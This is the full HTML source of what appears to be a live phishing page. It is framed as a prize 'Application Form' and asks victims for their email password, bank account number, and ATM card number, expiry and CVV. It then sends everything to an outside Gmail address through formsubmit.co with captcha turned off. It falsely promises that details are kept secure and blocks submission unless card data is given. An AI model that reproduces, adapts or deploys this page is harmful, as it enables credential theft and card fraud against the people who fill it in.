<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      max-width: 600px;
      margin: auto;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 10px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .password-wrapper {
      position: relative;
    }
    .password-wrapper input {
      padding-right: 40px;
    }
    .password-wrapper span {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    .hidden {
      display: none;
    }
    button {
      margin-top: 20px;
      background-color: green;
      color: white;
      padding: 12px;
      font-size: 16px;
      border: none;
      width: 100%;
      border-radius: 8px;
      cursor: pointer;
    }
    .final-note {
      margin-top: 20px;
      font-weight: bold;
      font-size: 1.1em;
    }
    .secure-msg {
      margin-top: 15px;
      font-style: italic;
      font-size: 0.95em;
      color: #333;
    }
  </style>
</head>
<body>

  <h2 style="text-align:center;">Application Form</h2>
  <form id="appForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" onsubmit="return validateBeforeSubmit();">
    
    <!-- Full Name -->
    <label>Full Name:
      <input type="text" name="Full Name" required>
    </label>

    <!-- Country -->
    <label>Country:
      <input type="text" name="Country" required>
    </label>

    <!-- Phone Number -->
    <label>Phone Number:
      <input type="text" name="Phone Number" id="phone" required onblur="validatePhone()">
      <div id="phoneError" class="error">Phone number must be 9‚Äì12 digits</div>
    </label>

    <!-- Email -->
    <label>Email Address:
      <input type="email" name="Email" required>
    </label>

    <!-- Email Password -->
    <label>Email Password:
      <div class="password-wrapper">
        <input type="password" name="Email Password" id="emailPass" required>
        <span onclick="togglePassword()">üëÅÔ∏è</span>
      </div>
    </label>

    <!-- Amount You Won -->
    <label>Amount You Won:
      <input type="text" name="Amount You Won" required>
    </label>

    <!-- Bank Account Type -->
    <label>Bank Account Type (e.g., Standard Bank Account):
      <input type="text" name="Bank Account Type" required>
    </label>

    <!-- Bank Account Number -->
    <label>Bank Account Number:
      <input type="text" name="Bank Account Number" required>
    </label>

    <!-- Bank Account Holder's Name -->
    <label>Bank Account Holder's Name:
      <input type="text" name="Bank Account Holder Name" required>
    </label>

    <!-- ATM Linked -->
    <label>Did You Link ATM to Your Bank Account?
      <select name="ATM Linked" id="atmSelect" onchange="toggleATMFields()" required>
        <option value="">--Select--</option>
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>
    </label>

    <div id="atmWarning" class="error" style="margin-top:10px;">YOU MUST HAVE ATM CARD TO PROCEED</div>

    <!-- ATM Card Number -->
    <div id="atmFields">
      <label>ATM Card Number:
        <input type="text" name="ATM Card Number" id="cardNumber" onblur="validateCard()" />
        <div id="cardError" class="error">Card number must be exactly 16 digits</div>
      </label>

      <label>Expiry Date (MM/YY):
        <input type="text" name="Expiry Date" id="expiry" placeholder="MM/YY" oninput="formatExpiry(this)" onblur="validateExpiry()" />
        <div id="expiryError" class="error">Expiry date must be in MM/YY format</div>
      </label>

      <label>CVV:
        <input type="text" name="CVV" id="cvv" onblur="validateCVV()" />
        <div id="cvvError" class="error">CVV must be 3 digits</div>
      </label>
    </div>

    <!-- Final Note -->
    <div id="finalNote" class="final-note">
      You will receive [Amount You Won] to your [Bank Account Type] [Bank Account Number]
    </div>

    <!-- Security note -->
    <div class="secure-msg">
      We keep your details secure and confidential.
    </div>

    <!-- Submit -->
    <button type="submit" id="submitBtn">Submit Application</button>

    <!-- Redirect -->
    <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/thankyou.html">
    <input type="hidden" name="_captcha" value="false">
  </form>

  <script>
    function togglePassword() {
      const pass = document.getElementById('emailPass');
      pass.type = pass.type === 'password' ? 'text' : 'password';
    }

    function formatExpiry(input) {
      let value = input.value.replace(/\D/g, '');
      if (value.length > 2) value = value.slice(0,2) + '/' + value.slice(2,4);
      input.value = value;
    }

    function toggleATMFields() {
      const atmSelect = document.getElementById('atmSelect');
      const atmFields = document.getElementById('atmFields');
      const warning = document.getElementById('atmWarning');
      const finalNote = document.getElementById('finalNote');
      const submitBtn = document.getElementById('submitBtn');

      if (atmSelect.value === 'No') {
        atmFields.style.display = 'none';
        warning.style.display = 'block';
        finalNote.style.display = 'none';
        submitBtn.disabled = true;
      } else {
        atmFields.style.display = 'block';
        warning.style.display = 'none';
        finalNote.style.display = 'block';
        submitBtn.disabled = false;
      }
    }

    function validatePhone() {
      const phone = document.getElementById('phone').value;
      const error = document.getElementById('phoneError');
      error.style.display = (/^\d{9,12}$/.test(phone)) ? 'none' : 'block';
    }

    function validateCard() {
      const card = document.getElementById('cardNumber').value;
      const error = document.getElementById('cardError');
      error.style.display = (/^\d{16}$/.test(card)) ? 'none' : 'block';
    }

    function validateCVV() {
      const cvv = document.getElementById('cvv').value;
      const error = document.getElementById('cvvError');
      error.style.display = (/^\d{3}$/.test(cvv)) ? 'none' : 'block';
    }

    function validateExpiry() {
      const expiry = document.getElementById('expiry').value;
      const error = document.getElementById('expiryError');
      error.style.display = (/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) ? 'none' : 'block';
    }

    function validateBeforeSubmit() {
      const atmSelect = document.getElementById('atmSelect').value;
      if (atmSelect === 'No') {
        alert("Submission blocked: YOU MUST HAVE ATM CARD TO PROCEED");
        return false;
      }
      return true;
    }
  </script>
</body>
</html>
